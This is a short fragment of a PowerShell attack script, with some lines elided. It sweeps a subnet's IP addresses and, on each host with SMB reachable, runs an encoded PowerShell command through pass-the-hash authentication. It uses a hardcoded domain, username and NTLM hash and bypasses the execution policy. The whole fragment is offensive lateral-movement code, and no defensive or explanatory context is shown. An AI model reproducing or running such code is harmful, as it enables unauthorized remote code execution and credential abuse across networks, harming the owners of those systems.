...
foreach ($ip in $ipAddresses) {
    ...
    for ($counter = 1; ([int]$octets[3] + $counter) -le 254; $counter++) {
        ...
        if ($smb) {
            ...
            $return = "test"
			Test-SMBOperation -Target $targetIP -Domain Duck.dom -Username Gilcol -Hash E19CCF75EE54E06B06A5907AF13CEF42 -Command "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encoded" -verbose
